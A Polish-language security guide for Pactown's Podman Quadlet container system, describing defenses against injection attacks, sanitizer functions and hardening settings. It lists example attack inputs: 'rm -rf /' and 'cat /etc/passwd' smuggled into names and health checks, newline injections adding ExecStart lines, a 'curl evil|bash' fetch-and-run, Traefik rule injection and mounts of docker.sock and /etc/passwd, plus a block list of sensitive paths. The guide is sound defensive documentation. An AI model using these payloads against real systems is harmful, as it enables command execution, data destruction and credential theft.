# Pactown Quadlet Security Guide

Dokumentacja zabezpieczeń systemu Podman Quadlet przed atakami injection i innymi zagrożeniami.

## Przegląd zabezpieczeń

Pactown implementuje wielowarstwową ochronę przed atakami:

| Warstwa | Ochrona |
|---------|---------|
| Input sanitization | Wszystkie dane wejściowe są filtrowane |
| Container isolation | Rootless Podman, user namespaces |
| Resource limits | CPU/memory limits via cgroups |
| Network isolation | Per-tenant networks |
| Filesystem | Read-only containers, tmpfs |
| Systemd | NoNewPrivileges, ProtectSystem |

## Testowane typy ataków

### 1. Container Name Injection

**Wektor ataku:**
```
name = "test; rm -rf /"
name = "test\nExecStart=/bin/bash"
```

**Ochrona:** `sanitize_name()` - usuwa niebezpieczne znaki

```python
# Dozwolone: a-zA-Z0-9_-
safe_name = sanitize_name("test; rm -rf /")
# Wynik: "test-rm-rf-"
```

### 2. Environment Variable Injection

**Wektor ataku:**
```
env = {"KEY": "value\n[Service]\nExecStart=/bin/bash"}
```

**Ochrona:** `sanitize_env_value()` - escapuje newlines

```python
safe_value = sanitize_env_value("value\n[Service]")
# Wynik: "value\\n(Service)"
```

### 3. Volume Mount Path Traversal

**Wektor ataku:**
```
volume = "../../../etc/passwd:/app/passwd"
volume = "/var/run/docker.sock:/var/run/docker.sock"
```

**Ochrona:** `validate_volume()` - blokuje niebezpieczne ścieżki

```python
BLOCKED_VOLUME_PATHS = [
    '/etc/shadow',
    '/etc/passwd', 
    '/proc',
    '/sys',
    '/dev',
    '/var/run/docker.sock',
    '/run/podman/podman.sock',
]
```

### 4. Traefik Label Injection

**Wektor ataku:**
```
subdomain = "evil.com`) || Host(`admin.legit.com"
```

**Ochrona:** `sanitize_domain()` - tylko znaki a-zA-Z0-9.-

```python
safe_domain = sanitize_domain("evil.com`) || Host(`admin")
# Wynik: "evil.comHostadmin"
```

### 5. Systemd Unit File Injection

**Wektor ataku:**
```
name = "test\n[Service]\nExecStartPre=/bin/bash -c 'curl evil|bash'"
```

**Ochrona:** Sanityzacja wszystkich pól + walidacja struktury

### 6. Command Injection via Health Check

**Wektor ataku:**
```
health_check = "/health; cat /etc/passwd"
```

**Ochrona:** `sanitize_health_check()` - tylko znaki URL path

```python
safe_hc = sanitize_health_check("/health; cat /etc/passwd")
# Wynik: "/healthcatetcpasswd"
```

## Funkcje sanityzacji

### sanitize_name(name: str) -> str

```python
# Usuwa: ; | & $ ` ( ) { } [ ] < > " ' \ / \n \r \x00
# Dozwolone: a-zA-Z0-9_-
# Max length: 63
```

### sanitize_env_value(value: str) -> str

```python
# Escapuje: \n -> \\n, \r -> \\r
# Blokuje: [Section] headers
```

### sanitize_domain(domain: str) -> str

```python
# Dozwolone: a-zA-Z0-9.-
# Max length: 253
```

### sanitize_image(image: str) -> str

```python
# Dozwolone: a-zA-Z0-9._:/@-
# Max length: 255
```

### sanitize_health_check(endpoint: str) -> str

```python
# Dozwolone: a-zA-Z0-9/_.-
# Musi zaczynać się od /
```

### validate_volume(volume: str) -> tuple[bool, str]

```python
# Sprawdza:
# - Newline injection
# - Blocked paths (shadow, proc, docker.sock)
# - Path traversal (..)
```

## Hardening Podman/Quadlet

### Container Security

```ini
[Container]
# Drop all capabilities
PodmanArgs=--cap-drop=ALL

# No new privileges
PodmanArgs=--security-opt=no-new-privileges:true

# Read-only filesystem
PodmanArgs=--read-only
PodmanArgs=--tmpfs=/tmp:rw,noexec,nosuid

# User namespace
PodmanArgs=--userns=keep-id

# Resource limits
PodmanArgs=--cpus=0.5 --memory=256M
```

### Systemd Hardening

```ini
[Service]
# Prevent privilege escalation
NoNewPrivileges=true

# Filesystem protection
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
PrivateDevices=true

# Kill mode
KillMode=mixed
```

## Testy bezpieczeństwa

Uruchom testy:

```bash
make test

# lub bez make:
PYTEST_DISABLE_PLUGIN_AUTOLOAD=1 PYTHONPATH=src python3 -m pytest -p pytest_asyncio.plugin tests/test_quadlet_security.py -v
```

### Pokrycie testów

| Kategoria | Testy |
|-----------|-------|
| Container Name Injection | 2 |
| Environment Variable Injection | 2 |
| Volume Mount Injection | 2 |
| Traefik Label Injection | 2 |
| Systemd Unit Injection | 2 |
| Security Hardening | 3 |
| Command Injection | 2 |
| Tenant Isolation | 2 |
| **Total** | **17** |

## Checklist przed produkcją

- [ ] Podman 4.4+ zainstalowany
- [ ] Rootless mode włączony (`loginctl enable-linger $USER`)
- [ ] SELinux/AppArmor enabled
- [ ] Firewall skonfigurowany (tylko 80/443)
- [ ] TLS enabled via Traefik + Let's Encrypt
- [ ] Resource limits ustawione per tenant
- [ ] Backup Quadlet configs
- [ ] Monitoring via journalctl

## Znane ograniczenia

1. **Path validation** - Symlink attacks wymagają runtime protection
2. **Resource exhaustion** - DoS via many containers (use tenant limits)
3. **Network segmentation** - Podman bridge nie izoluje jak K8s NetworkPolicy

## Raportowanie błędów

Znalazłeś lukę? Zgłoś prywatnie:
- Email: security@pactown.com
- GitHub: Private vulnerability report

**NIE** publikuj exploitów publicznie przed poprawką.
